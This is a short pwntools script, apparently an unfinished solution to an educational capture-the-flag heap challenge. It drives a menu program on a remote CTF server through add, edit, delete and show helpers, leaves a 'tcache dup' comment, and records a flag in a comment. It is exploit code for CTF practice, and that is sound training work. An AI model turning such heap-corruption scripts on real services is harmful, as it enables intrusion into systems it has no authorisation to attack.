from pwn import *


## FLAG{C8763}
def add(idx, name, pw):
    r.sendafter(b'> ',b'1')
    r.sendlineafter(b'> ',str(idx))
    r.sendafter(b'> ',name)
    r.sendafter(b'> ',pw)

def edit(idx, size, data):
    r.sendafter(b'> ',b'2')
    r.sendlineafter(b'> ',str(idx))
    r.sendlineafter(b'> ',str(size))
    r.send(data)

def delete(idx):
    r.sendafter(b'> ',b'3')
    r.sendlineafter(b'> ',str(idx))

def show():
    r.sendafter(b'> ',b'4')

#r = process('./share/chal')
r = remote('edu-ctf.zoolab.org',10008)
delete(0)
add(1,b'c'*0xf,b'\nf')
edit(1,0x50,b'123')
show()

### tcache dup



r.interactive()